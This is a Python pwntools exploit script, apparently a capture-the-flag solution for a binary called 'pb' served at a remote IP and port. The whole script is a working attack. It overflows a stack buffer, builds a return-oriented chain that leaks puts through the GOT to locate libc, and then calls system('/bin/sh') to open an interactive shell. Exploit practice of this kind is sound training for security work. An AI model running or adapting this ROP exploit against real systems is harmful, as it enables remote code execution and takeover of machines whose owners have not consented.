from pwn import *

elf = ELF('./pb')
libc = elf.libc

if args.REMOTE:
    p = remote('165.232.98.59', 32729)
else:
    p = process(elf.path)

def get_overflow():
    print(p.recvuntil('>>').decode('utf-8'))
    p.sendline("2")
    print(p.recvuntil(': ').decode('utf-8'))

def leak_libc():
    payload= b"A" * 56 # paddding
    payload+= p64(0x40142b) # pop rdi
    payload+= p64(0x403fa0) # got_put
    payload+= p64(0x401030) # plt_put
    payload+= p64(0x4012c2) # adress of box function

    p.sendline(payload)
    p.recvuntil(b'thank you!\n\n')
    leak = u64(p.recvline()[:-1].ljust(8,b'\x00'))
    return leak
    

with log.progress("Step 1: Leak libc address, print the address of puts"):
    get_overflow()
    leak = leak_libc()
    log.info("Leaked puts: " + str(hex(leak)))
    libc.address = leak - 0x80ed0 #libc.symbols['puts']
    
with log.progress("Step 2: use onegadget to get shell"):
    get_overflow()

    system = libc.sym.system 
    bin_sh = libc.search(b"/bin/sh").__next__() 

    payload=b"A"*56
    payload+=p64(0x401016) # ret
    payload+=p64(0x40142b) # pop rdi
    payload+= p64(bin_sh)
    payload+= p64(system)
   
    p.sendline(payload)	
    p.interactive()